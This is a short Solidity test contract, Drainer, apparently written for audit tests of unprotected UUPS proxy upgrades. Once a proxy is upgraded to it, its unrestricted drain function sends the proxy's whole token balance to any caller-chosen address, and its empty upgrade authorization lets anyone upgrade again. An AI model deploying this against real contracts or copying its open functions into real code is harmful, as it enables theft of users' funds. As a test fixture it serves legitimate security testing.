// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

/// @title Drainer — an attacker's "new version" used in the tests (QA.md F-01, F-02)
/// @notice Once a proxy runs this code, `drain` sends every token the proxy holds to `to`.
contract Drainer is UUPSUpgradeable {
    function drain(IERC20 token, address to) external {
        // Test helper: the point is that it works at all. Return value checked to keep lint quiet.
        require(token.transfer(to, token.balanceOf(address(this))), "transfer");
    }

    // solhint-disable-next-line no-empty-blocks
    function _authorizeUpgrade(address) internal override {}
}
